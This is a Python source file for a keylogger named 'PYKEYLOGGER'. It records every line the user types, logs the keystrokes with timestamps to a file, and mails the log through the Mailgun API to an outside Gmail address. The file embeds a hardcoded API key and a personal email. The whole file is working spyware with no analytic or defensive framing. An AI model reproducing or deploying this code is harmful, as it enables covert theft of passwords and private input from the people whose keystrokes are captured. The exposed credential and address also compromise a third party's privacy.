import keyboard
import requests
import datetime
import time

def file_flush():
    f = open("LOG.txt", 'w')
    f.write("\n")
    f.close()

def file_input(recorded):
    now_time = datetime.datetime.now()
    w = open("LOG.txt", 'a')

    w.write("\n")
    w.write(str(recorded))
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.write("\n")
    w.write(str(now_time))
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w .close()

def file_write(typedstr):
    w = open("LOG.txt", 'a')
    w.write("--------------------------------------\n")
    w.write("\n")
    w.write(typedstr)
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.close()

def send_simple_message(file_content):
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "PYKEYLOGGER <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  file_content})

if __name__ == "__main__":

     while 1:
         status = time.localtime()
         recorded = keyboard.record(until='enter')
         typedstr = " ".join(keyboard.get_typed_strings(recorded))
         file_input(recorded)
         file_write(typedstr)
         # conversion_kr()
         f = open("LOG.txt", 'r')
         file_content = f.read()
         f.close()
         send_simple_message(file_content)
         print("done")
         file_flush()
     # if (status.tm_min != 10):
     #     if (status.tm_sec != 30):
     #         f = open("LOG.txt", 'r')
     #         file_content = f.read()
     #         f.close()
     #         send_simple_message(file_content)
     #         print("done")
     #         file_flush()